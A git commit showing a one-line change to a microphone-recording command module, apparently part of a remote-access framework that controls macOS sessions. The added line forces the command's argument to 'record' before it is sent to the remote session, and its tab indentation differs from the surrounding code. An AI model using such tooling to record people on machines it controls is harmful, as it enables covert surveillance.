cc5424ec39c46776305f5de89a3ee461aacaa62d
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2020-04-08 13:59:44 +0300

    Update mic_macos.py

--- core/commands/macos/mic_macos.py
+++ core/commands/macos/mic_macos.py
@@ -88,5 +88,6 @@ class command:
                     h.info_error("Local directory: "+rp+": does not exist!")
         
         elif cmd_data['args'].split()[0] == "start":
+	    cmd_data['args'] = "record"
             h.info_general("Recording mic...")
             session.send_command(cmd_data)
